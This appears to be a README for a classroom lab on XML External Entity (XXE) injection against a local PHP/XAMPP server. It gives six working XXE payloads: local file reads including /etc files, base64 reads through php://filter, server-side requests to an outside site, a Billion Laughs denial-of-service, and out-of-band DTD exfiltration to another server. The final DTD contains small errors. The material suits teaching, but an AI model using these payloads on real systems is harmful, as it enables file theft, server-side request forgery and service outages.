From: https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection
https://dzone.com/articles/what-is-xml-external-entity-xxe
Run the php file in a XAMPP instance. Then issue queries to the server with these XMLs included (only one XML per query, so one example per query), e.g. with Postman.

These examples are intented to be performed live and by the fellow students.


1st task: Retrieve a non-binary file from the server's machine:
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///[ABSOLUTE PATH TO THE FILE]" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

2nd task: Retrieve a binary file from the server's machine (Base64 encoded):
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM
  "php://filter/read=convert.base64-encode/resource=file:///[ABSOLUTE PATH TO THE FILE]">
]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

3th task: Get the result of a request made by the server to a website (Base64 encoded):
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM
  "php://filter/read=convert.base64-encode/resource=http://google.de/">
]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

4th task: Billion Laughs attack:
```
<?xml version="1.0" encoding="ISO-8859-1"?> 
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY bar "World ">
  <!ENTITY t1 "&bar;&bar;&bar;&bar;&bar;&bar;">
  <!ENTITY t2 "&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;">
  <!ENTITY t3 "&t2;&t2;&t2;&t2;&t2;">
]>
<creds>
  <user>Hello &t2;</user>
  <pass>mypass</pass>
</creds>
```

5th task: Get the result of a request made by the server to a website (Wrapped in CDATA Tags):
```
bad.dtd:

<!ENTITY % file SYSTEM "file:///etc/[filename]">
<!ENTITY % cDataStart "<![CDATA[">
<!ENTITY % cDataEnd "]]>">
<!ENTITY % all "<!ENTITY contents 
'%cDataStart;%file;%cDataEnd;'>">

Post Request: 

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM
  "http://localhost/bad.dtd">
  %dtd;
  %all;
]>
<creds>
    <user>&contents;</user>
    <pass>mypass</pass>
</creds>
```

6th task: Redirect the result of the request to another server:
```
Sample XML:
 <?xml version="1.0"?>
<!DOCTYPE sampleList SYSTEM "http://localhost/attack.dtd">
 
<sampleList>
   <sampleElement>
      <title lang="en">Title</title>
      <name>Mike</name>
      <lastname>Smith</lastname>
   </sampleElement>
</sampleList>


Post Request: 
<?xml version="1.0"?>
<!DOCTYPE sampleList[
	<!ENTITY % remote SYSTEM "http://localhost/attack.dtd">
	%remote;%int;%trick;
]>
<sampleList>
   <sampleElement>
      <title lang="en">Title</title>
      <name>%int</name>
      <lastname>Smith</lastname>
   </sampleElement>
</sampleList>



attack.dtd: 
<!ENTITY % pay SYSTEM "http://localhost/passwd.txt">
<!ENTITY % int "<!ENTITY % trick SYSTEM ‘http://localhost/?var1=%pay1;’>">





